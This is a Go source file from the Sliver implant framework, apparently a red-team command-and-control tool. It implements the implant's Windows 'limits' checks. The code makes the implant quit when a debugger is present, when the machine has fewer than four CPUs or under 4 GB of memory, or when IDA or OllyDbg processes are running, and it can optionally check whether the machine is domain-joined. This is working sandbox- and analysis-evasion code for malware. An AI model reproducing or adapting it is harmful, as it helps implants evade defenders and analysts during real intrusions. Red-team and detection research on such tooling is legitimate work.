//go:build 386 || amd64 || arm64

package limits

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{else}}{{end}}
	"os"
	"strings"
	"syscall"
	"unicode/utf16"
	"unsafe"
)

// {{if .Config.LimitDomainJoined}}

func isDomainJoined() (bool, error) {
	var domain *uint16
	var status uint32
	err := syscall.NetGetJoinInformation(nil, &domain, &status)
	if err != nil {
		return false, err
	}
	syscall.NetApiBufferFree((*byte)(unsafe.Pointer(domain)))
	return status == syscall.NetSetupDomainName, nil
}

// {{end}}

func PlatformLimits() {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	isDebuggerPresent := kernel32.MustFindProc("IsDebuggerPresent")
	var nargs uintptr = 0
	ret, _, _ := isDebuggerPresent.Call(nargs)
	// {{if .Config.Debug}}
	log.Printf("IsDebuggerPresent = %#v\n", int32(ret))
	// {{end}}
	if int32(ret) != 0 {
		os.Exit(1)
	}
	// CPULimits
	getSystemInfo := kernel32.MustFindProc("GetSystemInfo")
	var si struct {
		ProcessorArchitecture     uint16
		Reserved                  uint16
		PageSize                  uint32
		MinimumApplicationAddress uintptr
		MaximumApplicationAddress uintptr
		ActiveProcessorMask       uintptr
		NumberOfProcessors        uint32
		ProcessorType             uint32
		AllocationGranularity     uint32
		ProcessorLevel            uint16
		ProcessorRevision         uint16
	}
	ret, _, _ = getSystemInfo.Call(uintptr(unsafe.Pointer(&si)))
	if int32(ret) != 0 {
		os.Exit(1)
	}
	if si.NumberOfProcessors < 4 {
		os.Exit(1)
	}
	// MemoryLimits
	type MEMORYSTATUSEX struct {
		Length               uint32
		MemoryLoad           uint32
		TotalPhys            uint64
		AvailPhys            uint64
		TotalPageFile        uint64
		AvailPageFile        uint64
		TotalVirtual         uint64
		AvailVirtual         uint64
		AvailExtendedVirtual uint64
	}
	memory := kernel32.MustFindProc("GlobalMemoryStatusEx")
	var mem MEMORYSTATUSEX
	mem.Length = uint32(unsafe.Sizeof(mem))
	ret, _, _ = memory.Call(uintptr(unsafe.Pointer(&mem)))
	if int32(ret) != 0 {
		os.Exit(1)
	}
	if mem.TotalPhys/1024/1024 < 4096 {
		os.Exit(1)
	}
	// IDA OLLyDbg limits
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		os.Exit(1)
	}
	defer syscall.CloseHandle(snapshot)
	var pe32 syscall.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	err = syscall.Process32First(snapshot, &pe32)
	if err != nil {
		os.Exit(1)
	}
	for {
		exeName := utf16ToString(pe32.ExeFile[:])
		err = syscall.Process32Next(snapshot, &pe32)
		if err != nil {
			break
		}
		if strings.Contains(strings.ToLower(exeName), "ida.exe") || (strings.Contains(strings.ToLower(exeName), "ollydbg.exe")) {
			os.Exit(1)
		}
	}
}

func utf16ToString(s []uint16) string {
	for i, v := range s {
		if v == 0 {
			s = s[:i]
			break
		}
	}
	return string(utf16.Decode(s))
}
